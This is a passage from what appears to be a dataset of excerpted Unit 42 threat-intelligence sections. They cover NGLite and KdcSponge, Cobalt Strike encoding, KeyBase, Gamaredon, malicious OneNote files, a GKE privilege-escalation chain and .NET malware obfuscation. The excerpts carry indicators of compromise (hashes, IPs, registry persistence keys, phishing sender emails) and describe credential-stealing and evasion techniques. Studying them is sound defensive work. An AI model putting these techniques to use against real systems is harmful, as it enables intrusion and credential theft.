(NKN)infrastructure for its command and control (C2) communications, which theoretically results in anonymity for its users. It's important to note that NKN is a legitimate networking service that uses blockchain technology to support a decentralized network of peers. The use of NKN as a C2 channel is very uncommon. We have seen only 13 samples communicating with NKN altogether \u2013 nine NGLite samples and four related to a legitimate open-source utility calledSurgethat uses NKN for file sharing.\nFinally, KdcSponge is a novel credential-stealing tool that is deployed against domain controllers to steal credentials. KdcSponge injects itself into the Local Security Authority Subsystem Service (LSASS) process and will hook specific functions to gather usernames and passwords from accounts attempting to authenticate to the domain via Kerberos. The malicious code writes stolen credentials to a file but is reliant on other capabilities for exfiltration.\nPalo Alto Networks customers are protected against this campaign through the following:\nCortex XDRlocal analysis blocks the NGLite backdoor. \nAll known samples (Dropper, NGLite, KdcSponge) are classified as malware inWildFire. \nCortex Xpansecan accurately identify Zoho ManageEngine ADSelfServicePlus, ManageEngine Desktop Central or ManageEngine ServiceDeskPlus Servers across customer networks.", "source": "Palo"}, {"title": "Conclusion", "content": "In September 2021, Unit 42 observed an attack campaign in which the actors gained initial access to targeted organizations by exploiting a recently patched vulnerability in Zoho's ManageEngine product, ADSelfService Plus, tracked in CVE-2021-40539. At least nine entities across the technology, defense, healthcare, energy and education industries were compromised in this attack campaign.\nAfter exploitation, the threat actor quickly moved laterally through the network and deployed several tools to run commands in order to carry out their post-exploitation activities. The actor heavily relies on the Godzilla webshell, uploading several variations of the open-source webshell to the compromised server over the course of the operation. Several other tools have novel characteristics or have not been publicly discussed as being used in previous attacks, specifically the NGLite backdoor and the KdcSponge stealer. For instance, the NGLite backdoor uses a novel C2 channel involving the decentralized network known as the NKN, while the KdcSponge stealer hooks undocumented functions to harvest credentials from inbound Kerberos authentication attempts to the domain controller.\nUnit 42 believes that the actor's primary goal involved gaining persistent access to the network and the gathering and exfiltration of sensitive documents from the compromised organization. The threat actor gathered sensitive files to a staging directory and created password-protected multi-volume RAR archives in the Recycler folder. The actor exfiltrated the files by directly downloading the individual RAR archives from externally facing web servers.\nThe following coverages across the Palo Alto Networks platform pertain to this incident:\nThreat Prevention signature ZOHO corp ManageEngine Improper Authentication Vulnerability was released on Sept. 20 as threat ID 91676. \nNGLite backdoor is blocked by Cortex XDR's local analysis. \nAll known samples (Dropper, NGLite, KdcSponge) are classified as malware inWildFire. \nCortex Xpanse can accurately identify Zoho ManageEngine ADSelfServicePlus, ManageEngine Desktop Central, or ManageEngine ServiceDeskPlus Servers across customer networks.\nIf you think you may have been impacted, please emailunit42-investigations@paloaltonetworks.comor call (866) 486-4842 \u2013 (866) 4-UNIT42 \u2013 for U.S. toll free, (31-20) 299-3130 in EMEA or (65) 6983-8730 in JAPAC. TheUnit 42 Incident Responseteam is available 24/7/365.\nSpecial thanks to Unit 42 Consulting Services and the NSA Cybersecurity Collaboration Center for their partnership, collaboration and insights offered in support of this research.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.\nIndicators of Compromise\nb2a29d99a1657140f4e254221d8666a736160ce960d06557778318e0d1b7423b5fcc9f3b514b853e8e9077ed4940538aba7b3044edbba28ca92ed37199292058\n805b92787ca7833eef5e61e2df1310e4b6544955e812e60b5f834f904623fd9f3da8d1bfb8192f43cf5d9247035aa4445381d2d26bed981662e3db34824c71fd5b8c307c424e777972c0fa1322844d4d04e9eb200fe9532644888c4b6386d7553f868ac52916ebb6f6186ac20b20903f63bc8e9c460e2418f2b032a207d8f21d\na44a5e8e65266611d5845d88b43c9e4a9d84fe074fd18f48b50fb837fa6e429dce310ab611895db1767877bd1f635ee3c4350d6e17ea28f8d100313f62b8738275574959bbdad4b4ac7b16906cd8f1fd855d2a7df8e63905ab18540e2d6f16005475aec3b9837b514367c89d8362a9d524bfa02e75b85b401025588839a40bcb\n3c90df0e02cc9b1cf1a86f9d7e6f777366c5748bd3cf4070b49460b48b4d4090b4162f039172dcb85ca4b85c99dd77beb70743ffd2e6f9e0ba78531945577665\n24.64.36[.]23845.63.62[.]10945.76.173[.]10345.77.121[.]23266.42.98[.]156140.82.17[.]161149.28.93[.]184149.248.11[.]205199.188.59[.]192\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\\ME_ADManager.exeSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\\ME_ADAudit.exeHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\KDC Service", "source": "Palo"}, {"title": "Introduction", "content": "Cobalt Strike is commercial threat emulation software that emulates a quiet, long-term embedded actor in a network. This actor, known as Beacon, communicates with an external team server to emulate command and control (C2) traffic. Due to its versatility, Cobalt Strike is commonly used as a legitimate tool by red teams \u2013 but is also widely used by threat actors for real-world attacks. Different elements of Cobalt Strike contribute to that versatility, including the encoding algorithm that obfuscates metadata sent to the C2 server.\nIn a previous blog, \"Cobalt Strike Analysis and Tutorial: How Malleable C2 Profiles Make Cobalt Strike Difficult to Detect,\" we learned that an attacker or red team can define metadata encoding indicators in Malleable C2 profiles for an HTTP transaction. When Cobalt Strike's Beacon \"phones home,\" it sends metadata \u2013 information about the compromised system \u2013 to the Cobalt Strike TeamServer. The red team or attackers have to define how this metadata is encoded and sent with the HTTP request to finish the C2 traffic communication.\nIn this blog post, we will go through the encoding algorithm, describe definitions and differences of encoding types used in the Cobalt Strike framework, and cover some malicious attacks seen in the wild. In doing so, we demonstrate how the encoding and decoding algorithm works during the C2 traffic communication, and why this versatility makes Cobalt Strike an effective emulator for which it is difficult to design traditional firewall defenses.", "source": "Palo"}, {"title": "Conclusion", "content": "Cobalt Strike is a potent post-exploitation adversary emulator. The five encoding algorithms detailed above are elaborate and are designed to evade security detections. A single security appliance is not equipped to prevent a Cobalt Strike attack. Only a combination of security solutions \u2013 firewalls, sandboxes, endpoints and software to integrate all these components \u2013 can help prevent this kind of attack.\nPalo Alto Networks customers are protected from this kind of attack by the following:\nNext-Generation Firewalls(NGFWs) withThreat Preventionsignatures 86445 and 86446 identify HTTP C2 requests with the Base64 metadata encoding in default profiles. \nWildFire, an NGFW security subscription, andCortex XDRidentify and block Cobalt Strike Beacon. \nAutoFocususers can track this activity using theCobaltStriketag", "source": "Palo"}, {"title": "Indicators", "content": "CS Samples\n6b6413a059a9f12d849c007055685d981ddb0ff308d6e3c2638d197e6d3e8802 \nf6e75c20ddcbe3bc09e1d803a8268a00bf5f7e66b7dbd221a36ed5ead079e093\nCS Beacon Samples\n/n9RdSHA256 Hash:fc95e7f4c8ec810646c16c8b6075b0b9e2cc686153cdad46e82d6cca099b19e7 \nSHA256 Hash:fc95e7f4c8ec810646c16c8b6075b0b9e2cc686153cdad46e82d6cca099b19e7 \nfc95e7f4c8ec810646c16c8b6075b0b9e2cc686153cdad46e82d6cca099b19e7 \n/flasSHA-256 Hash:11b8beaa53353f5f52607e994849c3086733dfa01cc57fea2dae42eb7a6ee972 \nSHA-256 Hash:11b8beaa53353f5f52607e994849c3086733dfa01cc57fea2dae42eb7a6ee972 \n11b8beaa53353f5f52607e994849c3086733dfa01cc57fea2dae42eb7a6ee972\nCS TeamServer IP addresses\n80.255.3[.]109 \n143.244.178[.]247", "source": "Palo"}, {"title": "Introduction", "content": "Be the first to receive the latest news, cyber threat intelligence and research from Unit 42.Subscribe Now.\nIn June 2015, Unit 42reportedon a keylogger malware family known as KeyBase, which had first appeared in February 2015. The author has since taken down its website and supposedly ceased selling the software, while also renouncing the tool's use for any malicious purposes. However, as of this writing, the software is still readily available for download with minimal effort on multiple websites. What's more, while development of KeyBase appears to have stopped, the usage of this malware has increased significantly since June. In our initial report, we identified approximately 1,500 sessions carrying KeyBase and approximately six months later we have seen over 4,900 different samples and 44,200 sessions within Palo Alto Networks AutoFocus.\nOne interesting discovery, identified by Unit 42 malware researcherJosh Grunzweigwas that while the KeyBase web panel requires authentication for access, the part of the KeyBase web panel which saves screenshots from the infected computers is not properly locked down, thus requiring no authentication and allowing anyone on the Internet to freely access it. This lack of security on the miscreants' part opens up a window to perform target analysis of the infected machines.\nFigure 1 - Open /Images/ directory\nBy leveraging the visibility within AutoFocus along with KeyBase web panels identified through information sharing groups, 64 websites have been identified hosting 82 active KeyBase web panels with a total of 933 infected Windows systems accounting for 125,083 screenshots. These images give us a glimpse into what attackers see when they infect systems, what information they obtain outside of the normal keystroke and clipboard logging capabilities of the malware, and how that information may be used for malicious activity. This blog post will explain our findings in detail, but here is a short summary of what you'll see if you read through to the end.\nIndia, China, South Korea and the United Arab Emirates are most targeted with KeyBase, but the impact is global. \nCompanies in the manufacturing and transportation industries see the most KeyBase infections. \nAttackers captured screenshots of sensitive e-mails, bank account transfers, security cameras and hotel management systems.\nAttackers who (accidentally) infected their own systems revealed the tactics, tools and procedures they used to launch their attacks.", "source": "Palo"}, {"title": "Conclusion", "content": "Our analysis provides a unique opportunity to see the entire life cycle of a malware infection. Commonly, we'd see the first image in a set to be the KeyBase executable or malicious document all the way through until the Anti-Virus alerts of an infection. Sometimes that happened all within one screenshot.\nFigure 94 - Infection and detection\nKeyBase isn't actively being developed, but we believe its use will continue to rise given its existing capabilities and easy-to-use builder.\nThe idiom that \"a picture is worth a thousand words\" holds true, especially if you've made it this far. KeyBase is loaded with features but the screenshot capability has proved to be particularly useful with the context it provides by marrying surrounding information to logged keystrokes. From a target analysis perspective, it gives us some insight into the type of companies, or people, the miscreants are going after, and hopefully this blog has shed some light on the potential data that gets exposed through screenshots alone.\nThreat Prevention customers are protected from this threat by theKeyBase command and control traffic signature. AutoFocus users can identify KeyBase samples using theKeyBasetag", "source": "Palo"}, {"title": "Indicators", "content": "E-mail Subjects:\n25270 usdA320A320 for ACMIBalance PaymentCOPY USD 23000$Confirm your bank detailsDemande de CotationFW: Attn: Your best price urgentlyFW: Re: Purchase Order InquiryFw: Outstanding PaymentFw: RE: 4800MW Combined Cycle Power PlantFwd: : Re: Original shipping DocumentsFwd: Shipping Documents/ Reference Id: 20150813-523838075605Fw: T/T Payment CopyGood DayINVOICE FOR ALCOHOLIC BEVERAGESInquiryInquiry SpecificationNEW MACHINE DESIGNNEW ORDER & ITEM WE NEEDNotre demandeOrder12/2015Order_NovOriginal shipping Documents today via dhlOur RequestPayment OutstandingQuotationRE : QuoationsRE : QuotationsRE: Re: Purchase Order InquiryRe : AttentionRe : Purchase order No.PEC/PUR/15-16/302Re : QuotationsRe: A320 on ACMIRe: Original shipping DocumentsRe: Purchase Order IniquiryRe: Purchase Order Iniqury for Your Kind AttentionRe: Purchase Order InquiryRe: Purchase Order Inquiry for Food Item and SeafoodRe: Purchase Order Inquiry for Kour Kind AttentionRe: Purchase Order Inquiry for Your Kind AttentionRe: Re: Last Order Schedule Notification 2015 (Order0261)Re:Payment for Diamond Wire for MarbleRe:UrgentService Tax Clarification on FlatTR: Order0118-NovUSD $24000 COPYUSD_30000$.scan0002.jpgWG: Order12/2015\nE-mail Senders:\nAVAL EXCHANGEAdminAeronautical Information ServicesAeronautical Information Services - ANS HeadquartersAmit VaraiyaAshish GuptaAsif AsifDiakalidia DissaDulal MohatoEcc ConseilsGhulam MurtazaHakan Shipping Co. LtdKrystyna MandrykinaKumar MohammadKyle P. Zing - ABS Group (Pacific Division)LIAONING ZHONGWANG GROUP CO., LTDLIGHTECH LLCLiaoning Zhongwang Group Co., LTDMKR Global TradingMKR Global Trading CompanyMehnas EnterprisesMuzafar SaafinPeghini, Rainer (LEN, VA)Rachel NataliaRazahmad HumrazSara AhmedShanaz Trading PTE SingaporeShanez Trading Ltd, SingaporeShanez Trading PTEShanez Trading PTE Ltd, SingaporeTarek Ben AissiVijay NathYasir Enterprisealy dembelemassin massinneco philragnar lordbrookraz ahmadvijay nathwali haider\nE-mail Addresses:\nketoanhcm@inde.com.vna.engl-lohninger@anti-germ.atabs-pac@eagle.orgadmin@lukeandcompany.com.auais@kcaa.or.keajooft1@naver.comalqardabyah@rakfzbc.aebenaisi.tarek@gmail.combicmanager@gmail.comcontact@paraboot.comcontacto@energiasrenovable.cldiakalidiadissa@ymail.comeccconseils@yahoo.frenterpriseyasir@yahoo.comfforteza@latinhotel.comgemataly@yahoo.frghulammurtaza2344@yahoo.comgullmuhd786@yahoo.cominfo11@redsealsuppliers.netiqbal.farooqi@ammiza.comkristina@mandrykina@gmail.comlightechllc@yahooo.commail@pcconnect.co.zamichelet220@yahoo.commkrmkrtrading_lib@outlook.comnecophil@yahoo.compostmaster@optimal-design.czr.hollman@mail.comraghida@jrtorbey.comragnarlordbrook@engineer.comratooltraders_2000@gmail.comrazahmad789@yahoo.comrpeghini@testo.desarita_199228@yahoo.comshaneztrading@hotmail.comtanhuong142@gmail.comtazzyy8826@daum.nettender@unicorndenmart.comtrangtran0709@gmail.comvijaynath_drilltaps@yahoo.co.inyasirenterprisse@yahoo.com\nArchive Name:\n0000123.zip25720 USD SWIFT CCOPY.jpgA320 for ACMIA320 for ACMI (3).aceA320 for ACMI (2).aceA320 for ACMI-1.aceA320 for ACMI.aceA320 for ACMI[1].aceA320_for_ACMI.aceACMI.aceBL_036050112202xls.gzBalance Payment.zipCOPY OF THE DOCUMENT_Pdf.zipCOPY OF WHATSAPP IMAGE_scan0003jpg.zipCOPY USD 23000$.Pdf.zipCOPY USD 25000$ scan0002 jpg.zipCOPY_USD_23000$.Pdf[1].zipCopy10Scanneddoc.aceDHL SHIPPMENT DOC FOR PENDING ORDERS.zipEID MUBARAK GREETING.pdf.zipFinalCopy_Scan.aceFinalProductList.zipInvoice for alcoholic beverages (2).aceInvoice for alcoholic beverages.aceInvoice.zipMV ALFA.zipNEW MACHINE DESIGN.JPG.zipNEW ORDER & ITEMS WE NEED.Pdf.rarNew Order.aceNewCopy_Scan0261.aceNewOrder.zipORIGINAL SHIPMENT DOC& BL.zipOrder #380358967.zipOrder Inquiry Specification.aceOrder Invoice.zipOrder _380358967.zipOur Quotations.acePayment Receipt#380358967.zipPo-September-Sept171763403583 (2).aceProductOrder List.zipQuotation.zipQuotation.rarQuotation.rar.zipRevised_OrderFinalScan0118_Revised.aceShipping documents .20150813-52383807565_pdf.rarSlip.zipSwift Copy CHF $15100 .rar.zipT.T Payment Copy.zipTT $25700 USD REMITTANCE.Pdf.zipTT APPLICATION $50,000 USD.Pdf.zipTT_H1245792776500_JPG.zipZnp0002.ziporder inquiry doc.acescan0002.jpg.zip\nEXE Name:\nACMI.exeBL_036050112202xls.exeBalance Payment.exeCOPY OF THE DOCUMENT_Pdf.exeCOPY USD 23000$.Pdf.exeCOPY_pdf.exeDHL SHIPPMENT DOC FOR PENDING ORDERS.exeEID MUBARAK GREETING.pdf.exeFinalProductList.exeInvoice for contract No. 182.exeMV ALFA.scrNEW TT RATES 28.07.2015_pdf.exeNew Order.exePAYMENT.exePo-September-Sept171763403583.exeQuotation.rar.exeUSD_20345_$ COPY_Pdf.exeUSD_34567 $_Pdf.exeinvoice doc.exeinvoice document.exescan0002.jpg.exe\nDOC Name:\nNEW MTO.docOrder01.docOrderInvoice.docP001.docPart1-Product List.docProductList.docRevised_OrderFinal.docSTC ORDER LIST.docScan0118_Revised.doc\nKeyBase Panels:\nA full list of the KeyBase control panels we have identified is available onGitHub.", "source": "Palo"}, {"title": "Introduction", "content": "Since November, geopolitical tensions between Russia and Ukraine have escalated dramatically. It is estimated that Russia has now amassed over 100,000 troops on Ukraine's eastern border, leading some to speculate that an invasion may come next. On Jan. 14, 2022, this conflict spilled over into the cyber domain as the Ukrainian government was targeted with destructive malware (WhisperGate) and a separate vulnerability in OctoberCMS was exploited to deface several Ukrainian government websites. While attribution of those events is ongoing and there is no known link toGamaredon(aka Primitive Bear), one of the most active existing advanced persistent threats targeting Ukraine, we anticipate we will see additional malicious cyber activities over the coming weeks as the conflict evolves. We have also observed recent activity from Gamaredon. In light of this, this blog provides an update on the Gamaredon group.\nSince 2013, just prior to Russia's annexation of the Crimean peninsula, the Gamaredon group has primarily focused its cyber campaigns against Ukrainian government officials and organizations. In 2017, Unit 42 published its first researchdocumenting Gamaredon's evolving toolkitand naming the group, and over the years, several researchers have noted that the operations and targeting activities of this group align with Russian interests. This link was recently substantiated on Nov. 4, 2021, when the Security Service of Ukraine (SSU)publicly attributedthe leadership of the group to five Russian Federal Security Service (FSB) officers assigned to posts in Crimea. Concurrently, the SSU also released an updatedtechnical reportdocumenting the tools and tradecraft employed by this group.\nGiven the current geopolitical situation and the specific target focus of this APT group, Unit 42 continues to actively monitor for indicators of their operations. In doing so, we have mapped out three large clusters of their infrastructure used to support different phishing and malware purposes. These clusters link to over 700 malicious domains, 215 IP addresses and over 100 samples of malware.\nMonitoring these clusters, we observed an attempt to compromise a Western government entity in Ukraine on Jan. 19, 2022. The sections below offer an overview of our findings in order to aid targeted entities in Ukraine as well as cybersecurity organizations in defending against this threat group.\nUpdate Feb. 16:When we originally published this report, we noted, \"While we have mapped out three large clusters of currently active Gamaredon infrastructure, we believe there is more that remains undiscovered.\" We have since discovered hundreds more Gamaredon-related domains, including known related-clusters, and also new clusters. We have updated ourIndicators of Compromise (IoCs)to include these additional domains and cluster observations.\nUpdate June 22:As noted in February, Unit 42 continues to monitor and research Gamaredon infrastructure and malware. Today we are sharing another update to ourGamaredon IoCs, listing infrastructure that we have observed since the previous update.\nFull visualization of the techniques observed, relevant courses of action and IoCs related to this Gamaredon report can be found in theUnit 42 ATOM viewer.\nPalo Alto Networks customers receive protections against the types of threats discussed in this blog by products includingCortex XDRand theWildFire,AutoFocus,Advanced URL FilteringandDNS Securitysubscription services for theNext-Generation Firewall.", "source": "Palo"}, {"title": "Conclusion", "content": "Gamaredon has been targeting Ukrainian victims for almost a decade. As international tensions surrounding Ukraine remain unresolved, Gamaredon's operations are likely to continue to focus on Russian interests in the region. This blog serves to highlight the importance of research into adversary infrastructure and malware, as well as community collaboration, in order to detect and defend against nation-state cyberthreats. While we have mapped out three large clusters of currently active Gamaredon infrastructure, we believe there is more that remains undiscovered. Unit 42 remains vigilant in monitoring the evolving situation in Ukraine and continues to actively hunt for indicators to put protections in place to defend our customers anywhere in the world. We encourage all organizations to leverage this research to hunt for and defend against this threat.\nProtections and Mitigations\nThe best defense against this evolving threat group is a security posture that favors prevention. We recommend that organizations implement the following:\nSearch network and endpoint logs for any evidence of the indicators of compromise associated with this threat group. \nEnsure cybersecurity solutions are effectively blocking against the active infrastructure IoCs identified above. \nImplement a DNS security solution in order to detect and mitigate DNS requests for known C2 infrastructure. \nApply additional scrutiny to all network traffic communicating with AS 197695 (Reg[.]ru). \nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200.\nFor Palo Alto Networks customers, our products and services provide the following coverage associated with this campaign:\nCortex XDRprotects endpoints from the malware techniques described in this blog.\nWildFirecloud-based threat analysis service accurately identifies the malware described in this blog as malicious.\nAdvanced URL FilteringandDNS Securityidentify all phishing and malware domains associated with this group as malicious.\nUsers ofAutoFocuscontextual threat intelligence service can view malware associated with these attacks using theGamaredon Group tag.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "In this post, we look at the types of embedded payloads that attackers leverage to abuse Microsoft OneNote files. Our analysis of roughly 6,000 malicious OneNote samples fromWildFirereveals that these samples have a phishing-like theme where attackers use one or more images to lure people into clicking or interacting with OneNote files. The interaction then executes an embedded malicious payload.\nSincemacros have been disabled by default in Office, attackers have turned to leveraging other Microsoft products for embedding malicious payloads. As a result, malicious OneNote files have grown in popularity. The OneNote desktop app is included by default in Windows in Office 2019 and Microsoft 365, which can load malicious OneNote files if someone accidentally opens one.\nWe find that attackers have the freedom to embed either text-based malicious scripts or binary files inside OneNote. This offers them more flexibility compared to traditional macros in documents.\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nNext-Generation Firewallwith cloud-delivered security services includingWildFire. \nPrisma Accessdevices with cloud-delivered security services including WildFire. \nCortex XDRandXSIAMagents help protect against post-exploitation activities using the multi-layer protection approach. \nTheUnit 42 Incident Responseteam can also be engaged to help with a compromise or to provide a proactive assessment to lower your risk.", "source": "Palo"}, {"title": "Background", "content": "Microsoft OneNote is a digital note-taking application that is part of the Microsoft Office suite. A OneNote file is essentially a digital notebook where people can store various types of information.\nAdditionally, Microsoft OneNote allows people to embed external files, enabling them to store files such as videos, images or even scripts and executables. However,Microsoft has started blocking embedded objectswith certain extensions that are considered dangerous within OneNote files running on Microsoft 365 on Windows.\nHowever, attackers often abuse the ability to embed objects by planting malicious payloads. Malicious OneNote samples typically disguise themselves as legitimate notes, often including an image and a button.\nAttackers use images to draw people's attention, and they rely on unsuspecting people clicking buttons to launch malicious payloads. This technique is popular for payload delivery as it leverages people's trust in legitimate note-taking applications.\nFigures 1, 2 and 3 show three different varieties of malicious OneNote samples with different types of embedded images and buttons. By hovering over the fake button, we can see the location and type of the payload planted in the OneNote file.\nIn Figure 1, the malicious OneNote sample asks the target to click on the view button to see the \"protected\" document. Upon doing so, a malicious VBScript file executes.\nSimilarly, Figures 2 and 3 show malicious OneNote documents with fake buttons that entice victims to execute an embedded EXE payload and an Office 97-2003 payload, respectively.", "source": "Palo"}, {"title": "Conclusion", "content": "We conclude that OneNote as an attack vector is more versatile than we initially thought. It can carry executable payloads, in addition to script-based downloaders. Also, like many other file types, attackers can use it for lateral movement.\nWhen embedding malicious payloads inside OneNote files, attackers mainly leverage JavaScript, PowerShell, Batch and VBScript. However, attackers occasionally use binary payloads such as executables or even Office 97-2003 files to achieve their objectives.\nOrganizations can consider blocking embedded payloads with dangerous extensions within OneNote files to protect their users against such attacks. More broadly, we recommend people limit their exposure by checking the embedded payload filenames and extensions in OneNote files by hovering over any buttons or images before clicking them.\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nNext-Generation Firewallwith cloud-delivered security services includingWildFire. \nPrisma Accessdevices with cloud-delivered security services including WildFire. \nCortex XDRandXSIAMagents help protect against post-exploitation activities using the multi-layer protection approach. \nTheUnit 42 Incident Responseteam can also be engaged to help with a compromise or to provide a proactive assessment to lower your risk.", "source": "Palo"}, {"title": "Indicators", "content": "The following are links to our Github repository containing file hashes for the OneNote files and payloads discovered during our research for this article.\n11,226 SHA256 hashes for the malicious OneNote files and payloads\u2013 GitHub \nSHA256 hashes for OneNote files mapped to SHA256 hashes for the payloads\u2013 GitHub", "source": "Palo"}, {"title": "Introduction", "content": "Before we start, there are some additional concepts that add context to exploring malicious actor motivations:\nOperational Maturity: A gauge of the effectiveness and efficiency of a malicious actor \nTargeting: How an attacker goes about selecting targets \nKey Roles: The expertise required to conduct an attack operation, from inception to meeting objectives", "source": "Palo"}, {"title": "Introduction", "content": "This article examines two specific issues in Google Kubernetes Engine (GKE). While each issue might not result in significant damage on its own, when combined they create an opportunity for an attacker who already has access to a Kubernetes cluster to escalate their privileges. This article serves as a crucial resource for Kubernetes users and administrators, offering insights on safeguarding their clusters from potential attacks.\nThe first issue we'll discuss is the default configuration of GKE's logging agent FluentBit, which runs by default on all clusters. The second issue is the default privileges for Anthos Service Mesh (ASM), which is an optional add-on that customers can enable. ASM is Google's implementation of the Istio Service Mesh that controls service-to-service communication within a GKE environment.\nIf an attacker has the ability to execute in the FluentBit container (e.g., by discovering a remotely exploitable vulnerability in that component) and the cluster has ASM installed, they can create a single powerful chain to gain complete control of a Kubernetes cluster. Attackers can use this access to conduct data theft, deploy malicious pods and disrupt the cluster's operations.\nKubernetes is the most widely adopted open-source container platform used for application deployment and management. Due to its complexity, many Kubernetes environments are susceptible to security breaches due to misconfiguration and excessive privileges. In some cases, this can occur without any awareness from the customer, which can leave them exposed to security vulnerabilities.\nGoogle fixed both configuration issues on Dec. 14, 2023, withGCP-2023-047.\nPalo Alto Networks customers are better protected from the attacks described in this article in the following ways:\nOrganizations can engage theUnit 42 Incident Response teamfor specific assistance. \nPrisma Cloudcan help you protect your Kubernetes cluster from a variety of threats, including attacks that target system pods and add-on pods. \nCortex XDRenhances the capabilities of SOC teams by providing a comprehensive incident narrative spanning the entire digital environment.", "source": "Palo"}, {"title": "Conclusion", "content": "Kubernetes is a powerful container orchestration platform that organizations of all sizes use to run their applications. However, system pods in some circumstances can be an unguarded area of an organization's security.\nCloud vendors automatically create system pods when your cluster is launched. They are built in your Kubernetes infrastructure, the same as add-on pods that have been created when you enable a feature. This is because cloud or application vendors typically create and manage them, and the user has no control over their configuration or permissions. This can also be extremely risky since these pods run with elevated privileges.\nThis post demonstrates how an attacker can use two issues in system pods and add-on pods to escalate privileges and gain admin permissions.\nPalo Alto Networks Protections and Mitigations\nPalo Alto NetworksPrisma Cloudis a cloud security platform that are designed to help you protect your Kubernetes cluster from a variety of threats, including attacks that target system pods and add-on pods.\nPrisma Cloud provides a variety of features that can help you to:\nMonitor and detect suspicious activity in your cluster. \nIdentify misconfigurations and excessive privileges in system pods and add-on pods. \nPrevent attackers from exploiting misconfigurations and vulnerabilities in system pods and add-on pods.\nBy using Prisma Cloud, you can improve the security of your Kubernetes cluster and protect it from a wide range of threats.\nCortex XDRenhances the capabilities of SOC teams by providing a comprehensive incident narrative which may span their entire digital environment. This is achieved through the integration of activity data from Kubernetes Nodes and Kubernetes API Server audit logs, as well as endpoint and network data. Cortex effectively uses this information to identify anomalous Kubernetes actions that align with established TTPs, including Kubernetes credential theft, cryptojacking, container escapes and other security threats.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "This article examines obfuscation techniques used in popular malware families, and offers some insights into possible opportunities for automating unpacking of these malware samples.\nWe will examine these behaviors in samples we have observed, showing how to extract their configuration parameters through unpacking each stage. Performing this same process through automation would allow a sandbox performing static analysis to extract crucial malware configuration parameters from such samples.\nMalware authors increasingly use advanced obfuscation techniques to evade sandbox detection, enabling widespread distribution. Static analysis is a process performed by sandboxes for examining samples, without directly executing them.\nAdversaries use the following techniques to deliver popular malware families like Agent Tesla, XWorm and FormBook/XLoader:\nCode virtualization \nStaged payload delivery \nDynamic code loading to introduce new code at runtime \nAdvanced Encryption Standard (AES) encryption \nCreating multi-stage payloads that are self-contained within the original sample\nPalo Alto Networks customers are better protected from the threats discussed in this article through the following products or services:\nOurNetwork Securitysolutions includingAdvanced WildFire,Advanced URL FilteringandAdvanced DNS Security \nCortex XDRandXSIAM\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Introduction", "content": "Malware authors use obfuscation techniques to hinder sandboxes from using static analysis, increasing the possibility that a malicious file will evade detection. This allows adversaries to distribute malware samples more effectively at scale.\nThis article examines obfuscation techniques used to deliver malware families like Agent Tesla, XWorm and FormBook/XLoader.\nThe obfuscation techniques can be grouped by objective and technique, as shown in Table 1.\nTable 1. Classification of obfuscation techniques\nLet us explain these techniques in more detail:\nAES cryptography:AES stands for Advanced Encryption Standard. This is a block cipher that uses the same symmetric key to encrypt plaintext or decrypt ciphertext. This is more secure than eXclusive OR (XOR) cryptography, which relies on a simple bitwise operation for lightweight obfuscation. \nCode virtualization:Code virtualization is a software protection technique that works by transforming code into specialized instructions. These instructions are written in such a way that they canonlybe executed by the accompanying custom interpreter. To unravel the program, one has to first understand the internals of the interpreter implementation. This extra step adds another layer of complexity to the analysis. \nStaged payloads:Staging is the practice of wrapping a core payload with multiple layers. Detonating several payloads in sequence, versus doing everything all at once, is an attempt by the attacker to evade detection. The malware sample could abort its infection chain partway through, if its initial payload fails or is detected, thus preventing exposure of its later stage payloads. As this design is modular, the malware author can also customize the combination of different payloads when creating the original malware sample. \nPayloads stored in the PE overlay:The PE overlay describesextra bytes appended to a filethat are not included in its metadata. Attackers often hide theirpayloads inside the PE overlay, because some static analysis tools skip processing this area. This practice can also be used by .NET malware, not just by standard PE files. \nDynamic code loading, deobfuscation and execution via .NET reflection:Reflectionis a feature of certain programming languages, including the .NET Framework, to execute strings as code at runtime. Reflection allows the running malicious process to introduce new objects into the system or inspect and manipulate existing objects already in the system. Reflection can also be abused to bypass access security restrictions, as it can modify private attributes or invoke internal methods not typically accessible otherwise.\nThis article will discuss in greater detail the chain of obfuscation techniques shown in Figure 1.\nA2023 article by K7 Labsdiscusses a first-stage .NET downloader that seems to be an earlier variant of samples we have observed. It contacts a command-and-control (C2) server to download a second-stage KoiVM dropper, which delivers payloads like Agent Tesla and Remcos RAT.\nIn the cluster of malware samples we observed, there were updated features such as using AES encryption instead of XOR encryption. This cluster also had multi-stage payloads that were self-contained within the original malware sample distributed.", "source": "Palo"}, {"title": "Conclusion", "content": "Malware authors commonly use obfuscation techniques like encryption and code virtualization to hide their malicious intent. This allows them to evade security mechanisms and sandbox detection.\nThe cluster of malware samples we have highlighted uses staged payloads encrypted with strong AES cryptography at each layer. This fileless malware is loaded, decrypted and executed in memory via reflection.\nBecause these advanced techniques are among the toughest to overcome, we hope to make more people aware of this issue. We would like to see more researchers put effort and resources into finding a principled way to defeat code virtualization protection schemes.", "source": "Palo"}, {"title": "Introduction", "content": "On August 23, 2017, we observed OilRig targeting an organization within the United Arab Emirates government. The attack involved a spear-phishing email that had a subject of \"Importan Issue\" and two Zip 